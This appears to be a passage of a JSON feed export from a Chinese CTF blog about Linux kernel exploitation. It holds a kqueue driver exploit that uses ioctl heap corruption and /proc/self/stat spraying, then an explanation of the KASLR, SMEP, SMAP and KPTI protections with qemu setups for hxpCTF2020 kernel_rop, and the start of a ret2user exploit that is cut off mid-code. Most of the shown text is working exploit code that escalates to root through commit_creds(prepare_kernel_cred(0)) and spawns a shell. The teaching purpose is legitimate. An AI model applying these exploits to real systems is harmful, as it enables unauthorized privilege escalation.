punctuation\">,</span> s<span class=\"token punctuation\">,</span> address<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">else</span> <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\033[34m\\033[1m[Info] %s \\033[0m\\n\"</span><span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">error</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\033[31m\\033[1m[Error] %s\\n\\033[0m\"</span> <span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">shell</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">getuid</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">error</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Failed to get root\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token function\">info</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Get root!\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">execl</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/bin/sh\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"sh\"</span><span class=\"token punctuation\">,</span><span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">save_status</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">__asm__</span><span class=\"token punctuation\">(</span>\n        <span class=\"token string\">\".intel_syntax noprefix;\"</span>\n        <span class=\"token string\">\"mov user_cs, cs;\"</span>\n        <span class=\"token string\">\"mov user_ss, ss;\"</span>\n        <span class=\"token string\">\"mov user_sp, rsp;\"</span>\n        <span class=\"token string\">\"pushf;\"</span>\n        <span class=\"token string\">\"pop user_rflags;\"</span>\n        <span class=\"token string\">\".att_syntax;\"</span>\n    <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    user_rip <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>size_t<span class=\"token punctuation\">)</span>shell<span class=\"token punctuation\">;</span>\n    <span class=\"token function\">info</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"status saved!\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">root</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">__asm__</span><span class=\"token punctuation\">(</span>\n        <span class=\"token string\">\".intel_syntax noprefix;\"</span>\n        <span class=\"token string\">\"mov rsi, rsp;\"</span>\n        <span class=\"token string\">\"mov rsi, [rsi + 8];\"</span>\n        <span class=\"token string\">\"sub rsi, 0x201179;\"</span>\n        <span class=\"token string\">\"mov r12 , rsi;\"</span>\n        <span class=\"token string\">\"mov r13 , rsi;\"</span>\n        <span class=\"token string\">\"add r12 , prepare_kernel_cred ;\"</span>\n        <span class=\"token string\">\"add r13 , commit_creds ;\"</span>\n\n        <span class=\"token string\">\"mov rdi, 0 ;\"</span>\n        <span class=\"token string\">\"call r12 ;\"</span>\n        <span class=\"token string\">\"mov rdi, rax ;\"</span>\n        <span class=\"token string\">\"call r13 ;\"</span>\n\n        <span class=\"token string\">\"swapgs;\"</span>\n        <span class=\"token string\">\"mov r14, user_ss;\"</span>\n        <span class=\"token string\">\"push r14;\"</span>\n        <span class=\"token string\">\"mov r14, user_sp;\"</span>\n        <span class=\"token string\">\"push r14;\"</span>\n        <span class=\"token string\">\"mov r14, user_rflags;\"</span>\n        <span class=\"token string\">\"push r14;\"</span>\n        <span class=\"token string\">\"mov r14, user_cs;\"</span>\n        <span class=\"token string\">\"push r14;\"</span>\n        <span class=\"token string\">\"mov r14, user_rip;\"</span>\n        <span class=\"token string\">\"push r14;\"</span>\n        <span class=\"token string\">\"iretq;\"</span>\n        <span class=\"token string\">\".att_syntax;\"</span>\n    <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">create</span><span class=\"token punctuation\">(</span>uint32_t max_entries <span class=\"token punctuation\">,</span> uint16_t data_size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    request_t request<span class=\"token punctuation\">;</span>\n    request<span class=\"token punctuation\">.</span>max_entries <span class=\"token operator\">=</span> max_entries<span class=\"token punctuation\">;</span>\n    request<span class=\"token punctuation\">.</span>data_size <span class=\"token operator\">=</span> data_size<span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">ioctl</span><span class=\"token punctuation\">(</span>fd <span class=\"token punctuation\">,</span> CREATE_KQUEUE <span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>request<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">delete</span><span class=\"token punctuation\">(</span> uint16_t queue_idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    request_t request<span class=\"token punctuation\">;</span>\n    request<span class=\"token punctuation\">.</span>queue_idx <span class=\"token operator\">=</span> queue_idx<span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">ioctl</span><span class=\"token punctuation\">(</span>fd <span class=\"token punctuation\">,</span> DELETE_KQUEUE <span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>request<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">save</span><span class=\"token punctuation\">(</span> uint16_t queue_idx <span class=\"token punctuation\">,</span> uint32_t max_entries <span class=\"token punctuation\">,</span>uint16_t data_size <span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    request_t request<span class=\"token punctuation\">;</span>\n    request<span class=\"token punctuation\">.</span>max_entries <span class=\"token operator\">=</span> max_entries<span class=\"token punctuation\">;</span>\n    request<span class=\"token punctuation\">.</span>queue_idx <span class=\"token operator\">=</span> queue_idx<span class=\"token punctuation\">;</span>\n    request<span class=\"token punctuation\">.</span>data_size <span class=\"token operator\">=</span> data_size<span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">ioctl</span><span class=\"token punctuation\">(</span>fd <span class=\"token punctuation\">,</span> SAVE <span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>request<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span> uint16_t queue_idx <span class=\"token punctuation\">,</span> uint16_t entry_idx <span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    request_t request<span class=\"token punctuation\">;</span>\n    request<span class=\"token punctuation\">.</span>queue_idx <span class=\"token operator\">=</span> queue_idx<span class=\"token punctuation\">;</span>\n    request<span class=\"token punctuation\">.</span>entry_idx <span class=\"token operator\">=</span> entry_idx<span class=\"token punctuation\">;</span>\n    request<span class=\"token punctuation\">.</span>data <span class=\"token operator\">=</span> data<span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">ioctl</span><span class=\"token punctuation\">(</span>fd <span class=\"token punctuation\">,</span> EDIT_KQUEUE <span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>request<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    \n    size_t buffer<span class=\"token punctuation\">[</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token number\">0</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">int</span> seq_fd<span class=\"token punctuation\">[</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token number\">0</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">save_status</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    queue_entry <span class=\"token operator\">*</span>entry <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>queue_entry <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    entry<span class=\"token operator\">-></span>idx <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n    entry<span class=\"token operator\">-></span>data <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    buffer<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>size_t <span class=\"token punctuation\">)</span>root<span class=\"token punctuation\">;</span>\n    buffer<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>size_t <span class=\"token punctuation\">)</span>root<span class=\"token punctuation\">;</span>\n    buffer<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>size_t <span class=\"token punctuation\">)</span>root<span class=\"token punctuation\">;</span>\n    buffer<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>size_t <span class=\"token punctuation\">)</span>root<span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">memcpy</span><span class=\"token punctuation\">(</span>entry<span class=\"token operator\">-></span>data <span class=\"token punctuation\">,</span> buffer <span class=\"token punctuation\">,</span> <span class=\"token number\">0x20</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    fd <span class=\"token operator\">=</span> <span class=\"token function\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/dev/kqueue\"</span> <span class=\"token punctuation\">,</span> O_RDWR<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">create</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x800</span> <span class=\"token punctuation\">,</span> MAX_DATA_SIZE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">create</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span> <span class=\"token punctuation\">,</span> MAX_DATA_SIZE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">create</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xffffffff</span> <span class=\"token punctuation\">,</span> MAX_DATA_SIZE<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    \n    <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">\"aaaaaaaaaaaaaaaa\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>entry<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n    <span class=\"token comment\">// 相当于修改 2 1</span>\n\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        seq_fd<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span>  <span class=\"token function\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/proc/self/stat\"</span><span class=\"token punctuation\">,</span> O_RDONLY<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">// getchar();</span>\n    <span class=\"token function\">save</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">2</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x20</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">;</span> \n\n    <span class=\"token function\">info</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"(size_t )root\"</span> <span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>size_t <span class=\"token punctuation\">)</span>root<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">read</span><span class=\"token punctuation\">(</span>seq_fd<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">,</span> buffer <span class=\"token punctuation\">,</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n</code></pre>\n<p><img src=\"/CTF/%E6%95%99%E4%BD%A0%E5%AD%A6%E5%86%85%E6%A0%B8-tty,seq/image-20221024141432723.png\" alt=\"image-20221024141432723\"></p>\n",
            "tags": [
                "kernel",
                "C语言"
            ]
        },
        {
            "id": "http://niyah.cn/CTF/%E6%95%99%E4%BD%A0%E5%AD%A6%E5%86%85%E6%A0%B8-linux%20kernel%20ROP%20%E4%B8%8B%E7%9A%84%E4%BF%9D%E6%8A%A4%E7%BB%95%E8%BF%87/",
            "url": "http://niyah.cn/CTF/%E6%95%99%E4%BD%A0%E5%AD%A6%E5%86%85%E6%A0%B8-linux%20kernel%20ROP%20%E4%B8%8B%E7%9A%84%E4%BF%9D%E6%8A%A4%E7%BB%95%E8%BF%87/",
            "title": "教你学内核-linux kernel ROP 下的保护绕过",
            "date_published": "2022-10-12T10:10:27.000Z",
            "content_html": "<blockquote>\n<p>确实没鸽</p>\n</blockquote>\n<a id=\"more\"></a>\n<h1 id=\"linux-kernel-rop-下的保护绕过\"><a class=\"markdownIt-Anchor\" href=\"#linux-kernel-rop-下的保护绕过\">#</a> linux kernel ROP 下的保护绕过</h1>\n<h2 id=\"内核保护\"><a class=\"markdownIt-Anchor\" href=\"#内核保护\">#</a> 内核保护</h2>\n<p>（1）<strong>KASLR</strong>：表示内核地址空间布局随机化，它通过随机化内核的基址值，使一些内核攻击更难实现。需要泄露内核符号的基地址来绕过</p>\n<p>（2）<strong>SMEP</strong>：（Supervisor Mode Execution Prevention），在现代 intel 处理器上，当设置了 CR4 存器的控制位时，会保护特权进程（比如在内核态的程序）不能在不含 supervisor 标志（对于 ARM 处理器，就是 PXN 标志）的内存区域执行代码。（直白地说就是内核程序不能跳转到用户态执行代码），这种保护使得以往的 exploit 使用的 ret2user 的方法直接失效。ret2user 即在内核控制执行流，使之跳转到用户可控的用户空间执行代码的技术。因为 SMEP，在用户空间的页表的虚拟地址并没有 supervisor 标志，当跳转到用户态时，会触发异常。</p>\n<p>要检查 SMEP 是否被激活，我们可以简单地读取 /proc/cpuinfo，检查是否有 smep 这个字段。</p>\n<p>（3）<strong>SMAP</strong>：（ Supervisor Mode Access Prevention），同理，这个和 SMEP 差不多，只不过 SMEP 负责执行控制，这里负责读写控制。因此内核态不能读写用户态的内存数据。那你可能会疑惑了，如果这样限制的话，内核和用户态程序怎么交流？通过修改标志位，使某位置临时取消 SMAP，来实现精确位置的读写。</p>\n<p>（4）<strong>KPTI</strong>：（Kernel page-table isolation）即内核页表隔离。通过把进程页表按照用户空间和内核空间隔离成两块来防止内核页表泄露。</p>\n<p>（5）<strong>FG-KASLR</strong>：（Function Granular KASLR）内核在加载的时候会以函数级别重新排布内核代码，也就是说每个函数的地址都会乱掉。</p>\n<h2 id=\"例题分析\"><a class=\"markdownIt-Anchor\" href=\"#例题分析\">#</a> 例题分析</h2>\n<p>通过一道例题来学习开启各种保护后劫持控制流的方法，以 hxpCTF2020 kernel_rop 为例，read 可以随便读，write 可以随便写，就不贴图了</p>\n<p>原始的 <a href=\"http://run.sh\">run.sh</a> 如下，保护全开，这边通过修改保护来探究各个保护下的 ROP 方法</p>\n<pre class=\"language-shell\" data-language=\"shell\"><code class=\"language-shell\">#!&#x2F;bin&#x2F;sh\nqemu-system-x86_64 \\\n    -m 256M \\\n    -cpu kvm64,+smep,+smap \\\n    -kernel vmlinuz \\\n    -initrd rootfs.cpio \\\n    -hdb flag.txt \\\n    -snapshot \\\n    -nographic \\\n    -monitor &#x2F;dev&#x2F;null \\\n    -no-reboot \\\n    -append &quot;console&#x3D;ttyS0 kaslr kpti&#x3D;1 quiet panic&#x3D;1&quot;</code></pre>\n<h3 id=\"level0-保护全关\"><a class=\"markdownIt-Anchor\" href=\"#level0-保护全关\">#</a> level0 保护全关</h3>\n<p>启动脚本</p>\n<p>把里面的保护全关掉</p>\n<pre class=\"language-shell\" data-language=\"shell\"><code class=\"language-shell\">gcc exp.c -static -o .&#x2F;fs&#x2F;exp\n# gcc exp.c -masm&#x3D;intel -static -o .&#x2F;fs&#x2F;exp\ncd fs\nfind . | cpio -o --format&#x3D;newc &gt; ..&#x2F;rootfs.cpio\ncd ..\n\nqemu-system-x86_64 \\\n    -m 256M \\\n    -cpu kvm64 \\\n    -kernel vmlinuz \\\n    -initrd rootfs.cpio \\\n    -hdb flag.txt \\\n    -snapshot \\\n    -nographic \\\n    -monitor &#x2F;dev&#x2F;null \\\n    -no-reboot \\\n    -s \\\n    -append &quot;console&#x3D;ttyS0 nokaslr nosmap nosmep nopti quiet panic&#x3D;1&quot;\n    </code></pre>\n<blockquote>\n<p>这种保护全关的情况其实是比较好操作的，因为存在直接溢出的情况下可以 ret2user，也就是在内核空间执行用户空间的代码，利用了内核空间可以访问用户空间这个特性来定向内核代码或数据流指向用户空间，并以 ring0 的特权级在用户空间完成提权操作。</p>\n</blockquote>\n<p>可以直接嵌入汇编代码完成对 commit_creds (prepare_kernel_cred (0)) 的调用并返回到用户态</p>\n<h5 id=\"exp\"><a class=\"markdownIt-Anchor\" href=\"#exp\">#</a> exp</h5>\n<pre class=\"language-c\" data-language=\"c\"><code class=\"language-c\"><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;string.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;unistd.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;fcntl.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/stat.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/types.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;sys/ioctl.h></span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;signal.h></span></span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">get_shell</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\nsize_t vmlinux_base <span class=\"token operator\">=</span> <span class=\"token number\">0xffffffff81000000</span><span class=\"token punctuation\">;</span>\nsize_t user_cs<span class=\"token punctuation\">,</span> user_ss<span class=\"token punctuation\">,</span> user_rflags<span class=\"token punctuation\">,</span> user_sp<span class=\"token punctuation\">;</span>\n\nsize_t commit_creds <span class=\"token operator\">=</span> <span class=\"token number\">0x4c6410</span><span class=\"token punctuation\">;</span>\nsize_t prepare_kernel_cred <span class=\"token operator\">=</span> <span class=\"token number\">0x4c67f0</span><span class=\"token punctuation\">;</span>\n\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">info</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>s <span class=\"token punctuation\">,</span> size_t address <span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>address<span class=\"token punctuation\">)</span> <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\033[32m\\033[1m[Info] %s : \\033[0m%#lx\\n\"</span><span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">,</span> address<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">else</span> <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\033[32m\\033[1m[Info] %s \\033[0m\\n\"</span><span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">error</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\\033[31m\\033[1m[Error] %s\\n\\033[0m\"</span> <span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">shell</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">getuid</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">error</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Failed to get root\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token function\">info</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Get root!\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">execl</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/bin/sh\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"sh\"</span><span class=\"token punctuation\">,</span><span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">save_status</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">__asm__</span><span class=\"token punctuation\">(</span>\n        <span class=\"token string\">\".intel_syntax noprefix;\"</span>\n        <span class=\"token string\">\"mov user_cs, cs;\"</span>\n        <span class=\"token string\">\"mov user_ss, ss;\"</span>\n        <span class=\"token string\">\"mov user_sp, rsp;\"</span>\n        <span class=\"token string\">\"pushf;\"</span>\n        <span class=\"token string\">\"pop user_rflags;\"</span>\n        <span class=\"token string\">\".att_syntax;\"</span>\n    <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">info</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"status saved!\"</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">show</span><span class=\"token punctuation\">(</span> size_t buf<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">,</span> <span class=\"token keyword\">int</span> len<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;</span>len<span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"0x%-4x -> 0x%lx\\n\"</span> <span class=\"token punctuation\">,</span> i<span class=\"token punctuation\">,</span>buf<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">set_offset</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    commit_creds <span class=\"token operator\">+=</span> vmlinux_base<span class=\"token punctuation\">;</span>\n    prepare_kernel_cred <span class=\"token operator\">+=</span> vmlinux_base<span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">info</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"commit_creds\"</span> <span class=\"token punctuation\">,</span> commit_creds<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">info</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"prepare_kernel_cred\"</span> <span class=\"token punctuation\">,</span> prepare_kernel_cred<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\nsize_t user_rip <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>size_t<span class=\"token punctuation\">)</span>shell<span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">get_shell</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">__asm__</span><span class=\"token punctuation\">(</span>\n        <span class=\"token string\">\".intel_syntax noprefix;\"</span>\n        <span class=\"token string\">\"movabs rax, prepare_kernel_cred;\"</span> <span class=\"token comment\">//prepare_kernel_cred</span>\n        <span class=\"token string\">\"xor rdi, 